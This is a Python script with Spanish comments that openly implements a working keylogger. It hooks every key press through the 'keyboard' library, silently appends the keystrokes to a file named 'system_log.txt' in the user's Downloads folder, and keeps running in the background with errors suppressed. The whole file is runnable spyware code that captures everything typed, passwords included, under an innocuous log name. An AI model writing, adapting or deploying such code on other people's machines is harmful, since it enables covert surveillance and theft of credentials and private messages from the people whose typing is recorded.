import time
import keyboard
import os
import datetime
import sys
# La librería 'keyboard' requiere la instalación previa: pip install keyboard

def keylogger_background():
    """
    Implementa un keylogger básico en segundo plano utilizando la librería 'keyboard'.
    Registra las pulsaciones en un archivo temporal del sistema.
    """
    # Define la ruta del archivo de registro en la carpeta de DESCARGAS del usuario.
    # La ruta será: C:\Users\TuNombreDeUsuario\Downloads\system_log.txt
    log_file = os.path.join(os.path.expanduser("~"), "Downloads", "system_log.txt")
    
    # Asegura que el directorio exista (aunque la carpeta Downloads generalmente existe)
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    
    def guardar_datos(datos):
        """Escribe los datos de la pulsación en el archivo de log."""
        try:
            # Para este ejemplo, solo escribe el caracter.
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(datos)
        except Exception as e:
            # Aquí lo silenciamos para que la ejecución no se detenga.
            pass

    def on_key(event):
        """
        Función callback que se ejecuta al presionar una tecla.
        Utiliza un diccionario y lógica 'if' para manejar las teclas especiales.
        """
        if event.event_type == keyboard.KEY_DOWN:
            special_keys = {
                'space': ' ',
                'enter': '\n', 
                'backspace': '',  # No registra backspace para mantener el log simple
                'tab': '    ',    # 4 espacios para representar el tabulador
                'caps lock': '[BLOQ_MAYUS]',
                'esc': '[ESC]',
                'windows': '[WIN]',
                'menu': '[MENU]'
            }
            
            # Obtiene el mapeo del carácter o usa el nombre del evento si no está en el diccionario
            key_char = special_keys.get(event.name, event.name)
            
            # Filtra (ignora) las teclas modificadoras y de navegación para no saturar el log
            if event.name in ['shift', 'ctrl', 'alt', 'right shift', 'left shift', 
                             'right ctrl', 'left ctrl', 'right alt', 'left alt', 
                             'windows', 'up', 'down', 'left', 'right', 'delete']:
                return # Ignora la pulsación de teclas modificadoras
            
            # Si el caracter es válido (no vacío/ignorando)
            if key_char:
                guardar_datos(key_char)

    # --- INICIO DEL PROGRAMA ---
    print(f"Keylogger iniciado. Registrando en: {log_file}")
    print("El programa ahora corre en segundo plano...")

    # Engancha (hook) la función 'on_key' a todos los eventos del teclado
    keyboard.hook(on_key)
    
    # Bucle de ejecución simple: mantiene el script escuchando
    try:
        # Pausa de 60 segundos (bajo uso de CPU).
        while True:
            time.sleep(60)  
    except:
        # El programa simplemente termina si hay una excepción (como CTRL+C)
        pass

if __name__ == "__main__":
    # La ejecución principal llama a la función de keylogger
    keylogger_background()